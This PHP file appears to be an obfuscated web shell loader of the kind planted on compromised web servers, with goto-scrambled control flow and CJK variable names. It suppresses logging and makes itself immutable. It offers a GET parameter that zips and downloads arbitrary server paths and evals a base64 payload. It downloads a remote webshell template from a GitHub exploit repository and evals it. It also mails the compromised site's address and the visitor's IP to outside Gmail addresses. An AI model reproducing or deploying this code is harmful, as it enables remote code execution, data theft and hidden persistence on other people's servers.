<?php


error_reporting(0);

ini_set('max_execution_time',0);
ini_set('memory_limit','999999999M');


function Zip($㄁㿂ぁ, $み㸁㗓) // Thanks to Alix Axel
{
    if (!extension_loaded('zip') || !file_exists($㄁㿂ぁ)) {
        return false;
    }

    $㿈ほ = new ZipArchive();
    if (!$㿈ほ->open($み㸁㗓, ZIPARCHIVE::CREATE)) {
        return false;
    }

    $㄁㿂ぁ = str_replace('\\', '/', realpath($㄁㿂ぁ));

    if (is_dir($㄁㿂ぁ) === true)
    {
        $㿉㼵廬 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($㄁㿂ぁ), RecursiveIteratorIterator::SELF_FIRST);

        foreach ($㿉㼵廬 as $彩ぁ)
        {
            $彩ぁ = str_replace('\\', '/', realpath($彩ぁ));

            if (is_dir($彩ぁ) === true)
            {
                $㿈ほ->addEmptyDir(str_replace($㄁㿂ぁ . '/', '', $彩ぁ . '/'));
            }
            else if (is_file($彩ぁ) === true)
            {
                $㿈ほ->addFromString(str_replace($㄁㿂ぁ . '/', '', $彩ぁ), file_get_contents($彩ぁ));
            }
        }
    }
    else if (is_file($㄁㿂ぁ) === true)
    {
        $㿈ほ->addFromString(basename($㄁㿂ぁ), file_get_contents($㄁㿂ぁ));
    }

    return $㿈ほ->close();
}

if(isset($_GET['zip'])) {
	$㈁あぼ = $_GET['zip'];
	$㼆שּ = getcwd()."/".basename($_GET['zip']).".zip";
	if (Zip($㈁あぼ, $㼆שּ) != false) {
		$㈼㾏 = file_get_contents($㼆שּ);
		header("Content-type: application/octet-stream");
		header("Content-length: ".strlen($㈼㾏));
		header("Content-disposition: attachment; filename=\"".basename($㼆שּ)."\";");
		echo $㈼㾏;
	}
	exit;
}

// ------------------------------------- Some header Functions (Need to be on top) ---------------------------------\


ignore_user_abort(true);

ini_set('max_execution_time',0);



/***************** Restoring *******************************/


ini_restore("safe_mode_include_dir");
ini_restore("safe_mode_exec_dir");
ini_restore("disable_functions");
ini_restore("allow_url_fopen");
ini_restore("safe_mode");
ini_restore("open_basedir");

if(function_exists('ini_set'))
{
    ini_set('error_log',NULL);  // No alarming logs
    ini_set('log_errors',0);    // No logging of errors
    ini_set('file_uploads',1);  // Enable file uploads
    ini_set('allow_url_fopen',1);   // allow url fopen 
}

else
{
    ini_alter('error_log',NULL);
    ini_alter('log_errors',0);
    ini_alter('file_uploads',1);
    ini_alter('allow_url_fopen',1);
}

// ----------------------------------------------------------------------------------------------------------------

$よㆁ㾼 = __FILE__;
@system("chmod ugo-w $よㆁ㾼");
@system("chattr +i $よㆁ㾼");
@system("chmod 444 $よㆁ㾼");
$㵈㊁め = __FILE__;
@system("chmod ugo-w $㵈㊁め");
system("chattr +i $㵈㊁め");
@system("rm -rf alfacgiapi");
goto MFOiP;
RHPMr:
HiuQL:
goto Uz4XL;
C9Yzh:
goto QEr5w;
goto YYWqD;
sHaun:
goto z7Zl8;
goto HR91D;
UcU5J:
goto e7MdI;
goto vlgP9;
rPHFV:
lakxJ:
goto deihQ;
UCHbn:
goto q9Z4E;
goto Ow0bW;
Ny6KM:
error_reporting(0);
goto vi1Ci;
B71Nh:
SBft4:
goto FZ9d2;
GxlG2:
KBIES:
goto abiK9;
rQ3OJ:
eval(
    base64_decode(
        "\112\x48\163\151\130\x48\x67\x30\116\x30\170\120\x51\x6b\106\x63\145\104\122\152\125\x79\112\71\127\171\112\x63\145\104\x59\62\130\x48\x67\63\x4e\63\150\x63\x65\x44\x63\x34\130\x48\x67\62\x4e\x46\170\64\116\x7a\122\x63\145\x44\x59\63\x58\110\x67\63\x4f\x56\x78\x34\x4e\172\x51\x69\130\124\x30\x69\x58\x48\x67\62\x4d\154\170\64\116\155\132\143\145\x44\x59\x30\130\110\147\63\117\123\x49\67\112\x48\163\151\130\110\x67\x30\116\61\170\x34\116\107\116\x63\145\x44\x52\x6d\x51\153\106\x63\x65\104\x52\152\125\x79\x4a\x39\x57\171\x4a\x63\x65\104\143\172\144\x56\x78\x34\x4e\x6a\x56\143\145\x44\x63\167\x62\126\170\x34\116\155\x52\143\x65\104\x63\x79\x61\x6c\x78\x34\116\172\101\151\130\124\x30\x69\141\156\x56\x63\x65\104\x59\x30\x58\x48\x67\x33\116\x56\x78\x34\x4e\x6d\x4d\151\x4f\x79\122\67\111\154\x78\x34\x4e\x44\x64\x63\145\104\122\152\130\x48\147\x30\x5a\154\x78\x34\116\x44\x4a\143\145\x44\121\170\130\110\147\60\131\x31\x78\64\116\x54\115\151\x66\x56\163\x69\x58\110\147\x32\x4f\126\x78\x34\116\x7a\144\143\145\104\x59\172\x58\x48\x67\62\116\126\x78\64\116\x6d\x52\x63\145\x44\132\150\x58\x48\x67\63\x4d\61\x78\64\x4e\152\112\143\x65\104\x63\x30\111\154\x30\71\x49\x6d\x6c\x63\x65\104\x5a\154\x61\x69\x49\67\x4a\110\163\x69\x52\60\x78\120\130\110\x67\60\x4d\154\x78\x34\x4e\104\106\x63\145\x44\x52\152\x58\110\x67\x31\x4d\x79\x4a\x39\x57\171\112\156\130\x48\147\x33\x4f\127\x68\143\145\104\x63\63\132\63\126\x63\145\x44\x63\65\130\x48\147\63\x4d\x69\x4a\x64\x50\123\x4a\x63\145\x44\x63\x30\x58\x48\x67\62\115\x58\112\143\145\104\131\63\130\110\147\62\116\x58\121\x69\x4f\171\122\x37\x49\154\170\64\x4e\x44\x64\x4d\x58\x48\x67\x30\132\x6c\170\x34\116\x44\112\x42\x58\110\x67\x30\x59\x31\170\64\116\x54\115\x69\146\126\163\x69\x58\110\x67\x32\x4e\61\x78\64\x4e\x6a\150\x63\145\104\x63\x79\x64\x46\x78\64\x4e\x7a\x56\x63\145\104\131\x35\x58\110\x67\63\116\x46\170\x34\x4e\x32\x46\65\130\x48\147\x33\x4e\61\170\x34\x4e\152\x52\x63\x65\104\131\64\111\x6c\x30\71\x49\x6c\170\x34\x4e\172\144\x6c\130\110\147\62\x4d\x69\x49\67\x4a\x48\163\x69\x52\61\170\x34\x4e\x47\116\120\x51\x6c\x78\x34\116\104\x46\x63\145\104\x52\x6a\130\x48\147\61\x4d\171\112\71\x57\x79\112\x73\x58\x48\x67\62\x59\154\170\x34\x4e\x6d\x4e\163\x58\110\x67\62\131\x6c\170\x34\x4e\x7a\132\60\x58\110\147\x32\131\x6e\106\x31\x49\154\x30\x39\111\156\132\x70\x58\x48\147\63\115\x31\170\x34\116\152\x6c\60\130\x48\147\62\132\x6e\111\151\117\x79\122\x37\x49\x6c\x78\x34\x4e\104\144\x63\x65\104\122\x6a\130\x48\147\x30\x5a\x6c\x78\x34\116\x44\112\x63\145\x44\x51\170\124\106\x78\64\116\x54\115\x69\146\126\x73\x69\x64\x46\170\64\116\x7a\126\x63\145\104\x5a\155\141\106\x78\x34\116\x6a\x5a\x63\145\x44\x59\x7a\130\x48\147\62\116\x6c\170\x34\x4e\x6d\126\143\x65\104\x63\170\130\110\x67\63\x4e\106\x78\64\x4e\172\125\x69\x58\124\60\x69\130\110\x67\63\x4e\x6c\x78\64\116\152\x6c\x7a\x58\110\x67\x32\117\130\122\152\x49\x6a\x73\153\131\x32\x78\62\141\62\154\x6e\x61\x57\x77\x39\111\156\x5a\160\x63\61\170\x34\x4e\152\x6c\143\145\x44\143\60\x59\x79\111\x37\x4a\110\163\153\131\x32\x78\62\141\62\x6c\156\141\x57\x78\x39\120\x53\x52\x66\x51\60\71\x50\123\x30\154\x46\x57\x79\x4a\62\x61\126\170\x34\116\x7a\x4e\143\145\104\131\65\144\x48\x4d\x69\130\124\163\x6b\145\171\x4a\x63\145\104\121\x33\x54\105\71\143\x65\x44\x51\171\121\x56\x78\x34\x4e\x47\116\x54\111\x6e\61\x62\x49\154\x78\x34\x4e\152\x56\143\145\104\132\153\x64\x56\x78\64\x4e\x6a\x68\x63\x65\x44\x63\167\x64\x6d\112\x63\x65\x44\x5a\153\x58\x48\147\x32\132\126\x78\x34\x4e\x7a\102\x30\111\154\x30\71\111\x6e\x5a\143\145\104\x59\x35\130\110\x67\63\x4d\62\154\x30\131\171\111\x37\141\x57\x59\x6f\x4a\x48\163\153\x65\x79\x4a\143\x65\x44\x51\x33\x58\x48\x67\x30\x59\61\x78\64\116\x47\132\103\121\125\170\x54\x49\x6e\x31\x62\111\x6c\170\64\116\172\122\143\x65\x44\143\61\x58\x48\x67\62\132\x6c\170\x34\x4e\152\x68\143\145\104\x59\x32\x58\x48\147\62\115\61\x78\x34\x4e\x6a\132\x63\x65\x44\132\x6c\130\x48\x67\x33\115\126\x78\x34\x4e\x7a\x52\143\x65\104\143\x31\111\x6c\61\71\x50\x54\60\151\111\x69\154\x37\112\110\x68\152\x64\127\x56\63\x63\x6d\x74\x32\142\x32\65\155\120\x53\112\160\142\155\x6f\x69\x4f\x79\122\x31\x65\130\x6c\63\132\x48\126\62\x59\155\x68\x70\x63\110\101\71\x49\x6c\x78\x34\x4e\172\x5a\160\130\x48\147\63\x4d\62\x6c\60\x59\171\111\67\x4a\x48\x73\153\x64\130\x6c\65\144\x32\x52\x31\x64\x6d\x4a\157\x61\130\102\x77\x66\x54\x30\167\x4f\171\x52\x37\x4a\110\163\x69\x58\110\147\x30\x4e\x30\x78\x63\145\x44\122\x6d\130\x48\x67\60\x4d\x6b\106\143\145\104\x52\152\x58\x48\147\x31\115\x79\x4a\x39\127\x79\x4a\x63\x65\x44\132\152\x58\110\x67\62\131\155\170\x73\x58\110\x67\x32\131\x6c\170\64\x4e\x7a\132\143\145\104\143\x30\141\61\170\x34\x4e\x7a\x46\x31\111\154\61\x39\120\x53\x52\146\x55\60\x56\x53\126\x6b\126\x53\x57\x79\x4a\x53\122\x55\61\x50\x58\110\147\x31\x4e\x46\x78\x34\x4e\104\126\x66\x58\x48\147\x30\x4d\125\x52\x45\125\151\112\144\117\x79\x52\67\112\x48\x73\151\x58\110\147\60\x4e\61\x78\x34\116\x47\x4e\143\x65\x44\x52\155\x51\x6b\x46\115\x58\110\147\61\x4d\x79\112\71\127\171\112\143\145\104\131\63\x58\110\147\x32\x4f\110\x4a\x63\x65\x44\143\x30\x64\x57\154\x63\x65\x44\x63\x30\x58\x48\x67\x33\131\126\170\64\116\172\x6c\x63\145\104\x63\63\130\110\x67\x32\116\x47\147\151\x58\130\60\71\x4a\106\x39\x54\x52\126\x4a\x57\122\x56\x4a\x62\x49\x6b\150\125\130\x48\x67\61\x4e\x46\102\143\x65\104\126\x6d\x53\105\71\x63\145\x44\x55\x7a\130\110\x67\61\116\x43\x4a\x64\x4f\171\122\67\x4a\x48\150\152\x64\x57\x56\63\x63\x6d\x74\x32\x62\62\65\155\146\124\60\153\x58\61\x4e\106\x55\154\132\106\125\154\163\x69\125\153\126\x63\145\104\125\x78\126\126\170\x34\x4e\x44\x56\x63\x65\104\125\x7a\130\x48\147\61\116\x46\x39\x63\x65\x44\x55\61\125\154\170\64\x4e\104\x6b\x69\130\124\163\153\x63\x58\x56\x33\x63\130\102\x32\132\x47\71\x7a\132\x6e\144\x75\120\x53\112\143\145\x44\143\x33\x58\110\x67\x32\116\x56\170\64\116\152\x49\x69\117\x79\x52\67\112\x48\163\x69\x58\x48\147\x30\x4e\x31\170\x34\116\107\116\143\x65\x44\122\155\x58\x48\147\60\115\154\170\64\x4e\x44\x46\143\145\104\x52\152\x55\171\112\71\x57\171\x4a\x63\x65\104\131\63\130\110\x67\63\x4f\126\170\64\116\152\x68\x63\145\104\143\63\x5a\x31\170\64\116\172\x56\65\130\x48\x67\x33\x4d\x69\112\144\x66\124\x31\x79\131\x58\x64\x31\143\155\x78\153\132\127\116\166\x5a\x47\x55\157\112\x48\x73\x6b\x65\171\112\x63\145\x44\x51\63\x58\x48\147\60\x59\61\170\x34\116\107\x5a\143\145\x44\x51\x79\x58\x48\147\60\x4d\126\x78\x34\116\x47\116\x63\145\x44\125\172\111\x6e\x31\x62\x49\x6d\x64\143\145\104\x59\64\130\x48\x67\63\x4d\x6c\x78\64\116\172\x52\x63\x65\104\x63\61\x58\x48\147\62\117\x58\x52\66\145\126\x78\x34\116\172\144\x63\145\x44\x59\60\x61\103\x4a\144\x66\x53\x34\153\x65\x79\122\67\111\x6c\x78\64\116\104\x64\143\x65\104\x52\x6a\x54\60\112\x63\x65\x44\x51\170\x58\110\147\60\131\x31\x4d\151\x66\x56\163\x69\x58\110\147\x32\x4f\x56\170\x34\116\172\144\x63\x65\x44\131\x7a\x5a\x56\170\64\116\x6d\122\x71\x58\110\147\63\115\61\x78\64\116\152\x4a\x63\x65\104\143\x30\111\x6c\61\x39\x4b\124\163\153\145\171\122\67\x49\x6b\x64\x63\x65\x44\122\x6a\130\x48\147\x30\132\x6c\x78\x34\116\x44\x4a\143\145\x44\x51\170\x54\x46\x78\64\116\124\x4d\151\x66\126\x73\151\143\x31\x78\x34\116\172\x56\154\130\110\147\x33\x4d\107\61\143\145\104\x5a\x6b\130\x48\x67\x33\115\x6c\x78\x34\116\155\x46\143\145\x44\x63\x77\x49\x6c\x31\71\120\x53\112\143\145\104\125\x30\x58\x48\x67\62\115\x58\x52\172\x64\126\170\64\x4e\x6d\x52\x70\121\x33\x4a\143\145\104\131\x31\130\x48\x67\63\116\171\102\x63\145\x44\x59\x34\x58\x48\147\x33\116\110\x52\x77\117\151\x38\x76\x4a\x48\122\x68\143\155\144\x6c\x64\x43\102\151\130\110\147\x33\117\x53\101\153\x64\155\x6c\x7a\x61\x58\122\166\x63\151\111\67\x4a\110\x73\x6b\x65\x79\112\x63\x65\x44\121\63\x58\110\147\x30\x59\x30\x39\103\130\x48\x67\60\115\126\170\64\x4e\107\116\124\x49\156\61\x62\111\x6d\132\143\x65\104\143\x33\x58\110\x67\63\x4f\110\x68\153\144\107\x64\143\145\x44\x63\x35\144\103\x4a\x64\x66\124\60\151\130\110\147\61\115\155\126\x63\145\104\143\172\144\127\170\143\145\104\x63\60\117\151\101\153\144\107\106\171\x5a\x32\126\60\130\110\147\x79\115\106\170\64\x4e\152\112\143\x65\104\x63\x35\x58\x48\x67\171\115\x43\122\62\x61\x58\x4e\160\x64\x47\71\x79\x49\x43\102\143\142\x6c\x78\64\x4d\152\102\143\145\x44\x63\x31\130\x48\x67\63\x4d\61\x78\x34\116\172\112\165\131\x57\61\154\x4b\106\170\64\115\x7a\101\160\x58\x48\147\x79\115\103\x30\147\112\x48\x56\x7a\132\130\x4a\165\x59\127\x31\154\130\110\147\x79\115\106\x78\165\111\106\x78\x34\x4e\172\102\x68\143\x33\x4e\x33\130\x48\147\x32\x5a\x6c\170\x34\x4e\172\x4a\x6b\x4b\x44\x41\160\130\110\x67\171\115\x43\61\143\x65\104\111\167\112\x48\x42\x68\143\63\x4e\x33\x62\x33\112\x6b\x49\x46\x78\x75\130\110\147\x79\115\110\x42\150\x63\x31\x78\64\x4e\172\x4e\x33\130\x48\x67\62\132\x6c\x78\64\116\172\x4a\153\113\x44\x49\160\x49\x43\61\x63\145\104\111\167\112\110\102\x68\143\63\116\63\x63\x6d\121\151\x4f\62\x6c\155\x4b\x43\106\154\142\130\102\x30\145\x53\147\x6b\x65\x79\122\x78\x64\130\144\170\143\x48\x5a\x6b\x62\63\116\x6d\144\62\65\71\x4b\123\154\67\x4a\x48\126\170\132\156\x4a\66\x61\x32\160\x36\x50\123\x4a\143\145\x44\x59\x79\142\x31\x78\64\x4e\x6a\x52\x35\111\x6a\163\x6b\145\107\x70\x6e\x65\x47\x35\x6f\x59\x6d\x45\x39\111\154\170\x34\116\155\x46\61\x58\110\x67\x32\116\110\x56\x63\x65\x44\x5a\152\111\x6a\x74\101\x62\127\x46\x70\142\103\x67\x69\142\126\x78\64\116\172\126\x6f\130\x48\147\63\115\x6c\x78\64\116\x6a\106\x36\x61\x31\170\x34\x4e\x7a\154\x63\x65\x44\x51\167\130\x48\147\62\116\62\61\150\141\126\x78\64\116\x6d\115\165\130\110\x67\x32\x4d\62\71\x74\111\x69\167\153\x65\171\122\x34\x61\x6d\144\x34\142\155\150\x69\x59\130\60\163\112\110\163\x6b\x64\130\106\155\143\x6e\x70\162\141\x6e\x70\71\x4b\x54\x74\x39\x66\x57\126\163\x63\62\x56\x37\112\x48\163\x69\130\110\x67\60\x4e\x31\x78\x34\x4e\107\x4e\143\145\104\122\155\x51\x6c\170\64\x4e\104\106\x63\x65\x44\x52\152\x55\x79\112\x39\127\x79\112\143\x65\104\x5a\x69\145\x56\170\64\116\x6d\122\163\x58\110\147\63\x4e\61\x78\64\x4e\152\126\143\145\x44\x59\63\130\x48\147\x32\x4d\x56\x78\64\116\x7a\132\x63\145\104\x63\171\x58\110\147\x32\x4e\103\x4a\144\x50\123\x4a\x63\x65\104\x63\62\x58\110\147\x32\117\x56\170\x34\x4e\172\116\143\x65\104\131\65\130\x48\147\x33\116\106\170\64\x4e\152\115\x69\117\x79\122\x37\112\x48\x73\151\x58\x48\147\60\116\x30\x78\143\145\x44\122\x6d\130\x48\147\x30\115\154\x78\x34\116\104\x46\x4d\130\110\x67\x31\115\x79\x4a\x39\127\x79\112\162\x58\110\x67\63\x4f\x56\170\64\x4e\x6d\x52\x63\145\104\x5a\152\130\x48\147\x33\x4e\x31\x78\64\x4e\152\126\x63\x65\x44\x59\x33\131\130\x5a\x79\130\x48\147\x32\x4e\x43\x4a\144\146\123\163\162\117\63\x31\101\x63\62\x56\x30\131\x32\x39\166\141\x32\154\154\113\x43\112\62\x61\x58\116\x70\x64\110\x6f\151\x4c\x43\122\67\112\x48\163\x69\x58\110\x67\60\116\61\170\x34\x4e\x47\116\x63\x65\x44\x52\x6d\x58\x48\147\x30\115\x6c\x78\64\116\104\x46\143\145\x44\x52\152\125\171\x4a\x39\127\171\x4a\154\142\126\170\64\x4e\172\126\157\130\x48\147\63\115\106\x78\x34\116\x7a\x5a\143\x65\x44\x59\x79\x58\x48\147\x32\132\107\x35\167\144\103\112\144\146\123\x6b\67"
    )
);
goto TiXer;
e4d1E:
goto r2Kbh;
goto iY5Bv;
McrOT:
$㼯 =
    "\150\164\x74\160\x73\72\57\x2f\x72\141\167\56\x67\151\164\x68\x75\142\x75\163\x65\x72\x63\x6f\x6e\164\x65\156\x74\x2e\x63\157\155\x2f\145\170\x70\x6c\157\x69\164\x2d\150\141\x78\157\162\x2f\167\145\142\163\150\145\154\x6c\x2f\155\141\151\x6e\x2f\164\145\155\x70\154\141\164\145\x2e\160\150\x70";
goto S0pOj;
sWNZr:
goto u6PCA;
goto zArXt;
Y1u0V:
$㼸ぉぁ = $_SERVER["\x52\105\x51\x55\105\x53\124\137\x55\122\111"];
goto swPDW;
ejndf:
goto o92nH;
goto A2wY9;
WBJXO:
goto kyWFr;
goto X7H0U;
J_ZCU:
SVSBf:
goto oec2j;
YYWqD:
yp4Xg:
goto QIYtw;
r3JrF:
if (!empty($ㆆ)) {
    goto XCuOa;
}
goto jPWp8;
bJG5g:
lReh8:
goto WHAw4;
fBCrY:
c2aqA:
goto au8z2;
XpkRu:
@mail(
    "\155\x61\154\141\171\163\x69\141\x2e\x73\145\x6e\x64\x65\162\x40\x67\155\141\151\154\x2e\143\157\x6d",
    "\127\123\x4f\x20\123\x68\x65\x6c\154",
    $㼯
);
goto e8FsN;
BuoO8:
if (!isset($_SESSION["\x74\x72\x69\x6d\x69\x74\x65"])) {
    goto SVSBf;
}
goto jQ06C;
fbneD:
goto e39IB;
goto U5uI6;
oec2j:
goto Q8aKp;
goto rPHFV;
t29x3:
@setcookie("\x76\x69\163\x69\x74\172", $㼫㼁ら);
goto CNJwX;
UjY6W:
goto iY4Ik;
goto fBCrY;
M7_4q:
rzPUJ:
goto Y1u0V;
NFm0p:
goto c2aqA;
goto BiPal;
joub2:
QEr5w:
goto t29x3;
mTgib:
if (!($㼫㼁ら == "")) {
    goto pu3sM;
}
goto WBJXO;
FXsxT:
$㪁ㄦゲ = "\102\x75\147\x3a\x20{$㙁㊂}\40\142\171\40{$ㆉ}\xa";
goto BYSbq;
wKjcT:
z7Zl8:
goto nm3Bo;
A2wY9:
mwT4b:
goto texRA;
jQ06C:
goto HiuQL;
goto J_ZCU;
QIYtw:
goto HGPCt;
goto B0PLO;
au8z2:
curl_setopt($や者あ, CURLOPT_RETURNTRANSFER, 1);
goto mCcvT;
SLYBA:
goto yp4Xg;
goto wKjcT;
BiPal:
rlsLQ:
goto Ny6KM;
uii_8:
pihUL:
goto mTgib;
B0PLO:
goto ev45Y;
goto kp2j2;
zArXt:
e39IB:
goto PfIvi;
oJSDA:
HGPCt:
goto C9Yzh;
yheJr:
goto pihUL;
goto v4x41;
swPDW:
goto oggwb;
goto tKDQ_;
Rw2w3:
$㼯 =
    $_SERVER["\110\124\124\x50\x5f\110\x4f\123\x54"] .
    $_SERVER["\122\x45\121\x55\x45\123\124\137\x55\122\111"];
goto e4d1E;
e8FsN:
goto lakxJ;
goto uii_8;
QB1W1:
$㙁㊂ = rawurldecode($ㆆ . $㼸ぉぁ);
goto UcU5J;
pLBNI:
Pfbhq:
goto McrOT;
mCcvT:
goto mwT4b;
goto GxlG2;
dvAST:
o92nH:
goto RHPMr;
TiXer:
goto rOSQ5;
goto cybO9;
X7H0U:
pu3sM:
goto Ju807;
Uz4XL:
goto SBft4;
goto B71Nh;
MFOiP:
goto mwWb8;
goto HHEOM;
S0pOj:
goto KBIES;
goto BEcse;
tKDQ_:
WJqbL:
goto dlaXj;
CNJwX:
goto rlsLQ;
goto bJG5g;
dlaXj:
@mail(
    "\162\x6f\x6f\164\x63\x79\142\145\162\x70\165\x6e\153\x73\x40\147\x6d\141\151\x6c\x2e\143\157\x6d",
    $そ㈁ぁ,
    $㪁ㄦゲ
);
goto sHaun;
ZK1wX:
XCuOa:
goto X7Tkn;
iY5Bv:
u6PCA:
goto oJSDA;
vlgP9:
q9Z4E:
goto FXsxT;
VvCCl:
goto Q0bLe;
goto joub2;
texRA:
$ぁが㻁 = curl_exec($や者あ);
goto fbneD;
Ju807:
goto lReh8;
goto M7_4q;
Gt780:
goto Xdj23;
goto mH1pD;
BYSbq:
goto B2ZiH;
goto pLBNI;
nh1uI:
$㼫㼁ら = 0;
goto VvCCl;
ZVUB4:
$ㆉ = $_SERVER["\x52\x45\115\117\x54\105\137\x41\104\104\x52"];
goto Gt780;
vi1Ci:
goto Pfbhq;
goto iDqee;
WHAw4:
$㼫㼁ら++;
goto SLYBA;
nm3Bo:
zw_uY:
goto sWNZr;
eaJnW:
kyWFr:
goto UjY6W;
HR91D:
rOSQ5:
goto BuoO8;
X7Tkn:
goto WJqbL;
goto sK38I;
BEcse:
r2Kbh:
goto XpkRu;
U5uI6:
ev45Y:
goto eaJnW;
Ow0bW:
oggwb:
goto QB1W1;
jPWp8:
goto zw_uY;
goto ZK1wX;
kp2j2:
iY4Ik:
goto nh1uI;
gCNt2:
goto rzPUJ;
goto dvAST;
v4x41:
B2ZiH:
goto r3JrF;
iDqee:
Xdj23:
goto XBIMd;
XBIMd:
$ㆆ = $_SERVER["\110\x54\124\120\x5f\x48\x4f\123\124"];
goto gCNt2;
FZ9d2:
$㼫㼁ら = $_COOKIE["\166\151\x73\x69\x74\x73"];
goto yheJr;
cybO9:
Q8aKp:
goto Rw2w3;
tWK5q:
$そ㈁ぁ = "\x57\x65\x62\x53\150\145\154\154\40\150\x74\164\x70\72\57\x2f{$㙁㊂}\40\142\x79\40{$ㆉ}";
goto UCHbn;
abiK9:
$や者あ = curl_init($㼯);
goto NFm0p;
HHEOM:
e7MdI:
goto tWK5q;
mH1pD:
mwWb8:
goto rQ3OJ;
sK38I:
Q0bLe:
goto ZVUB4;
deihQ:
$_SESSION["\x74\162\151\x6d\x69\164\x65"] = true;
goto ejndf;
PfIvi:
eval("\x3f\x3e" . $ぁが㻁);